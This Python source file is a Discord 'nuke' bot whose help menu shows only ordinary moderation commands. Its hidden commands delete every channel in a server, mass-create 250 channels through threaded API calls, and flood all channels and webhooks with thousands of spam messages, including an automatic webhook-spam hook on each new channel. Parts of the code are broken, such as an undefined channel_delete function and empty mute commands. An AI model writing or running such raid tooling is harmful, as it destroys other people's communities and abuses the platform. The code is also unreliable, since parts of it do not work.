import sys
import discord
import requests
import json
import threading
import random
import asyncio
from discord.ext import commands
from discord.ext.commands import has_permissions
from time import sleep
from datetime import datetime

now = datetime.now()
ftime = now.strftime("%H:%M:%S")

session = requests.Session()

prefix = input("prefix; ")
token = input("bot token; ")
chan = input("channel name(s);")
stats = input("status of the bot; ")
spamdata = input("msg you're gonna spam; ")
role = input("role name(s); ")
webname = input("webhook name(s); ")
amountss = 1000
intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help")

if bot:
    headers = {"authorization": f"Bot {token}"}
else:
    headers = {"authorization": token}


@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(stats))
    print("logged in as {bot.user.name}")
    print(f"bot prefix; {prefix}")

    print("Nuke Commands: .nukedogshitserver, .spam; Moderation Commands; clear, kick, ban, mute, unmute, addrole, removerole,")


@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="mod cmds",
        description="below are some common moderation commands:",
        color=discord.Color.blue(),
    )
    embed.add_field(name=f"{prefix}purge", value="delete a specified number of messages.")
    embed.add_field(name=f"{prefix}mute", value="mute a user in the server.")
    embed.add_field(name=f"{prefix}unmute", value="unmute a previously muted user.")
    embed.add_field(name=f"{prefix}ban", value="ban a user from the server.")
    embed.add_field(name=f"{prefix}kick", value="kick a user from the server.")
    embed.add_field(name=f"{prefix}addrole", value="add a role to a user.")
    embed.add_field(name=f"{prefix}removerole", value="remove a role from a user.")



    await ctx.send(embed=embed)


@bot.command()
@has_permissions(manage_messages=True)
async def purge(ctx, amount: int):
    await ctx.message.delete()
    await ctx.channel.purge(limit=amount)


@bot.command()
@has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member):
    await ctx.message.delete()
    await member.kick()


@bot.command()
@has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member):
    await ctx.message.delete()
    await member.ban()


@bot.command()
@has_permissions(manage_roles=True)
async def mute(ctx, member: discord.Member):
    await ctx.message.delete()
    


@bot.command()
@has_permissions(manage_roles=True)
async def unmute(ctx, member: discord.Member):
    await ctx.message.delete()
    


@bot.command()
@has_permissions(manage_roles=True)
async def addrole(ctx, member: discord.Member, role: discord.Role):
    await ctx.message.delete()
    await member.add_roles(role)


@bot.command()
@has_permissions(manage_roles=True)
async def removerole(ctx, member: discord.Member, role: discord.Role):
    await ctx.message.delete()
    await member.remove_roles(role)



@bot.command(name="nukedogshitserver")
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        await channel.delete()

    def cc(i):
        json = {"name": i}
        session.post(
            f"https://discord.com/api/v9/guilds/{guild}/channels",
            headers=headers,
            json=json,
        )

    for i in range(250):
        for channel in list(ctx.guild.channels):
            threading.Thread(target=channel_delete, args=(channel.id,)).start()
    for i in range(250):
        threading.Thread(target=cc, args=(chan,)).start()


@bot.command(name="spam")
async def spam(ctx):
    await ctx.message.delete()
    amountspam = 1000
    for i in range(amountspam):
        for channel in ctx.guild.channels:
            await channel.send(spamdata)


@bot.command()
async def swh(ctx):
    await ctx.message.delete()
    amountspam = 10000
    for i in range(amountspam):
        for webhook in ctx.guild.webhooks:
            await webhook.send(spamdata)


@bot.event
async def on_guild_channel_create(channel):
    try:
        webhook = await channel.create_webhook(name=webname)
        for i in range(10000):
            await webhook.send(spamdata)
    except:
        print("ratelimited xd")


bot.run(token)